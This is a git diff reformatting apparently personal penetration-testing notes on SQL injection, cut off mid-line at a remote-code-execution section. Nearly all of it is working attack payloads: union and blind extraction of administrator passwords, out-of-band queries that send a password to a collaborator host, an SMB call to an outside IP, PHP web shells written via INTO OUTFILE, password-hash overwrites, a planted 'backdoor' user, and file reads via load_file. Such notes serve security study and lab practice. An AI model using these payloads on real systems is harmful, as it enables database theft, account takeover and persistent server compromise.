@@ -61,7 +61,7 @@
 ### Introduction
 
 **Tools**
-- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [SQL injection cheat sheet | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
 - [SQL Injection cheat sheets | ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
 - [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
@@ -71,82 +71,86 @@
 - [XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
 - [NoSQL | MongoDB](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
 
-**MySQL**
-- `mysql -u root -p'root' -h <IP> -P 3306` connect to the database
-- `select version();` retrieve the db version
-- `select system_user();` inspecting the current session's user
-- `show databases;` list all available databases
-  - `USE databasetmp` use the `databasetmp` database
-  - `SHOW TABLES`
-- `SELECT user, authentication_string FROM mysql.user WHERE user = 'rooter';` inspect user `rooter`'s encrypted password
+**Database Commands**
 
-**MSSQL**
-- `impacket-mssqlclient <user>:<password>@<IP> -windows-auth` connect to remote instance via Impacket
-- `SELECT @@version;` retrieve the db version
-- `SELECT name FROM sys.databases;` list all available databases
-- `SELECT * FROM tempdb.information_schema.tables;` inspect the available tables in the `tempdb` database
-- `SELECT * from tempdb.dbo.users;`
+- **MySQL**
+  - Connect to the database: `mysql -u root -p'root' -h <IP> -P 3306`
+  - Retrieve the DB version: `select version();`
+  - Inspect the current session's user: `select system_user();`
+  - List all available databases: `show databases;`
+    - Use a specific database: `USE databasetmp`
+    - Show tables in the database: `SHOW TABLES`
+  - Inspect user `rooter`'s encrypted password: `SELECT user, authentication_string FROM mysql.user WHERE user = 'rooter';`
+  
+- **MSSQL**
+  - Connect to remote instance via Impacket: `impacket-mssqlclient <user>:<password>@<IP> -windows-auth`
+  - Retrieve the DB version: `SELECT @@version;`
+  - List all available databases: `SELECT name FROM sys.databases;`
+  - Inspect the available tables in the `tempdb` database: `SELECT * FROM tempdb.information_schema.tables;`
+  - Select from a specific table: `SELECT * from tempdb.dbo.users;`
 
-### Identification
+### Types of SQL Injection
 
-**Error based**
+#### Error-Based SQL Injection
+
 - `' OR '1'='1`
 - `' OR '1'='1' --`
 - `' OR 1=1 #'`
 - `' UNION SELECT NULL,NULL,NULL--`
-  - add / remove NULLs to make the query work
-  - on Oracle, they work differently. See PortSwigger
+  - Add/remove NULLs to make the query work
+  - Note: On Oracle, they work differently. See PortSwigger
 - `Accessories' UNION SELECT table_name, NULL FROM all_tables--`
 - `Accessories' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BIZMOI'--`
 - `Accessories' UNION SELECT PASSWORD_ZRFHII, USERNAME_SCSVZM FROM USERS_BIZMOI--`
 - `' UNION SELECT NULL,username||'~'||password FROM users--`
 - `1 UNION SELECT username||':'||password FROM users--`
 
-**Blind**
+#### Blind SQL Injection
+
+**Blind - Boolean-Based**
 - First char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`
 - Second char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'm`
 - Third char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'm`
-- etc.
-- Note: it can be automated with Intruder Cluster bomb
+- Note: This can be automated with Intruder Cluster bomb
 
-**Blind - error based**
+**Blind - Error-Based**
 - `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
   - Test length of a password
 - `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-**Blind - verbose SQL errors**
+**Blind - Verbose SQL Errors**
 - `CAST((SELECT example_column FROM example_table) AS int)`
 - `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
 - `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
 - `Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
-**Blind - time based**
+**Blind - Time-Based**
 - `'; IF (1=1) WAITFOR DELAY '0:0:10';--`
 - `'; IF (1=2) WAITFOR DELAY '0:0:10';--`
 - `'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--`
-  - testing the existence of the table users
+  - Testing the existence of the table `users`
 - `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--`
-  - testing the existence of the column username
+  - Testing the existence of the column `username`
 - `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--`
-  - testing the presence of another column, in this case, searching if it starts with pass. Using % you can test letter by letter
-- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10';--`
-  - see how may columns there are in the db
+  - Testing the presence of another column, in this case, searching if it starts with `pass`. Using `%` you can test letter by letter
+- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users')>3) WAITFOR DELAY '0:0:10';--`
+  - See how many columns there are in the DB
 - `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'butch' AND password_hash='8' WAITFOR DELAY '0:0:5'--`
-  - discover password_hash
+  - Discover password_hash
 - `'; update users set password_hash = 'tacos123' where username = 'butch';--`
-  - try update an user creds
-  - verify the success of it with the query `'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--`
-  - for the hash, try various combination (md5sum, sha1sum, sha256sum): `echo -n 'tacos123' | md5sum`
+  - Try to update user creds
+  - Verify the success with the query: `'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--`
+  - For the hash, try various combinations (md5sum, sha1sum, sha256sum): `echo -n 'tacos123' | md5sum`
     - `'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--`
-- See exploit https://www.exploit-db.com/exploits/47013
+- See exploit: [Exploit DB](https://www.exploit-db.com/exploits/47013)
 
-**Blind - delay with conditions**
+**Blind - Delay with Conditions**
 - `x'%3b SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END--`
 - `x'%3b SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
 - `x'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
-  - to automate this: Resource pool > New resource pool with Max Concurrent requests = 1
+  - To automate this: Resource pool > New resource pool with Max Concurrent requests = 1
 
-**DNS lookup**
+**DNS Lookup**
 - `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wggnzi1futt3lvlzdsfuiwfdg4mvapye.oastify.com/"> %remote;]>'),'/l') FROM dual--`
 - `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.chx30y2vv9ujmbmfe8gajcgthknbb6zv.oastify.com/"> %remote;]>'),'/l') FROM dual--`
 - `' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--`
@@ -154,34 +158,35 @@
 
 **HTML Encoding**
 - `&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;`
-- https://mothereff.in/html-entities
-  
+- [Mother Eff HTML Entities](https://mothereff.in/html-entities)
+
 ### Notes
 
-- If you find path / slug you might find an SQLi
-- `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
+**SQLi Discovery and Exploitation**
+- If you find a path/slug, you might find an SQLi
 - `SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"`
+- `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
 - `%27%20union%20select%20%27%3C?php%20echo%20system($_REQUEST[%22bingo%22]);%20?%3E%27%20into%20outfile%20%27/srv/http/cmd.php%27%20--%20-`
 
-**Extract database information**
+**Extract Database Information**
 - Extract the version: `?id=1 union all select 1, 2, @@version`
 - Extract the database user: `?id=1 union all select 1, 2, user()`
 - Extract table names: `?id=1 union all select 1, 2, table_name from information_schema.tables`
-- Extract table columns `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
-- An example of extracting the `users` table: `?id=1 union all select 1, username, password from users`
+- Extract table columns: `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
+- Example of extracting the `users` table: `?id=1 union all select 1, username, password from users`
 
 **Authentication Bypass**
 - `tom’ or 1=1 LIMIT 1;#`
   - `#` is a comment marker in MySQL/MariaDB
   - `LIMIT 1` is to return a fixed number of columns and avoid errors when our payload is returning multiple rows
 
-**Insert a new user**
-```SQL
+**Insert a New User**
+```sql
 insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 ```
 
-**Local File Inclusion (LFI)**<br/>
-Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
+**Local File Inclusion (LFI)**
+- Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
 
 **Remote Code Execution (RCE)**
 - ```SQL
